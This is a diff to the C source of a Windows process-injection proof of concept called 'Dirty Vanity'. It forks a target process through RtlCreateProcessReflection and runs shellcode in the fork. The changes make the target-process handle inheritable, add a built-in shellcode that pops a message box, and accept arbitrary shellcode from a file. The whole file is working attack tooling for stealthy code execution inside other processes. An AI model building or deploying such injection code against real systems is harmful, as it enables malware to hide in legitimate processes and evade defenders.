@@ -2,6 +2,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <ntstatus.h>
+#include "original_shellcode.h"
 
 #ifndef RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED
 #define RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED 0x00000001
@@ -71,10 +72,10 @@ BOOL ProcessForkingInjection(DWORD targetPid, unsigned char* shellcode, SIZE_T s
     printf("[+] Target PID: %lu\n", targetPid);
     printf("[+] Shellcode size: %zu bytes\n", shellcodeSize);
 
-    // Open target process
+    // Open target process with inheritable handle (required for RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES)
     HANDLE hProcess = OpenProcess(
         PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_DUP_HANDLE,
-        FALSE,
+        TRUE,  // bInheritHandle must be TRUE when using RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES
         targetPid
     );
     if (hProcess == NULL) {
@@ -171,16 +172,18 @@ int main(int argc, char* argv[]) {
     printf("[+] Process Forking Injection POC (Dirty Vanity)\n");
     printf("[+] Windows Fork API Abuse - RtlCreateProcessReflection\n\n");
 
-    if (argc != 3) {
-        printf("Usage: %s <target_pid> <shellcode.bin>\n", argv[0]);
+    if (argc < 2 || argc > 3) {
+        printf("Usage: %s <target_pid> [shellcode.bin]\n", argv[0]);
         printf("\n");
         printf("Example:\n");
-        printf("  %s 1234 calc_shellcode.bin\n", argv[0]);
+        printf("  %s 1234                    - Use built-in position-independent shellcode\n", argv[0]);
+        printf("  %s 1234 calc_shellcode.bin - Use shellcode from file\n", argv[0]);
         printf("\n");
         printf("Notes:\n");
         printf("  - Requires PROCESS_VM_OPERATION, PROCESS_VM_WRITE, PROCESS_CREATE_THREAD, PROCESS_DUP_HANDLE permissions\n");
         printf("  - Target process will be forked with shellcode as entry point\n");
         printf("  - Forked process inherits target's memory and handles\n");
+        printf("  - IMPORTANT: Shellcode MUST be position-independent (PEB walking style)\n");
         return 1;
     }
 
@@ -190,15 +193,32 @@ int main(int argc, char* argv[]) {
         return 1;
     }
 
+    unsigned char* shellcode;
     SIZE_T shellcodeSize;
-    unsigned char* shellcode = ReadShellcodeFromFile(argv[2], &shellcodeSize);
-    if (shellcode == NULL) {
-        return 1;
+    BOOL shouldFree = FALSE;
+
+    if (argc == 2) {
+        // Use built-in position-independent shellcode
+        printf("[+] Using built-in position-independent shellcode\n");
+        printf("[+] Shellcode: cmd /k msg * Hello from Dirty Vanity\n");
+        shellcode = DIRTY_VANITY_SHELLCODE;
+        shellcodeSize = sizeof(DIRTY_VANITY_SHELLCODE);
+        printf("[+] Shellcode size: %zu bytes\n\n", shellcodeSize);
+    } else {
+        // Read from file
+        shellcode = ReadShellcodeFromFile(argv[2], &shellcodeSize);
+        if (shellcode == NULL) {
+            return 1;
+        }
+        shouldFree = TRUE;
+        printf("\n");
     }
 
     BOOL success = ProcessForkingInjection(targetPid, shellcode, shellcodeSize);
 
-    free(shellcode);
+    if (shouldFree) {
+        free(shellcode);
+    }
 
     if (success) {
         printf("\n[+] Process forking injection successful!\n");
